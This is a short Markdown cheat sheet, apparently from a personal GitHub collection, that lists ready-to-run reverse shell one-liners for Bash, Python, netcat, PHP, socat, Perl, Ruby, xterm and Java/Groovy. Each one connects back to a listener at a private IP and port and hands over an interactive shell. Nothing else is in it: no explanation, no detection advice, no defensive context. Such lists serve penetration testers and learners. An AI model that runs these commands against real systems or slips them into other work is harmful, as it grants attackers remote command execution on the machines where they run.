# Reverse Shell Cheat Sheet

### Bash
```
bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
```

### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Netcat
```
nc -e /bin/sh 192.168.0.5 4444
```

### PHP
```
php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Socat
```
socat tcp-connect:192.168.0.5:4444 system:/bin/sh
```

### Perl
```
perl -e 'use Socket;$i="192.168.0.5";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("192.168.0.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### xTerm
```
xterm -display 192.168.0.5:4444
```

### Java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/192.168.0.5/4444;cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---
:::info
[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)
:::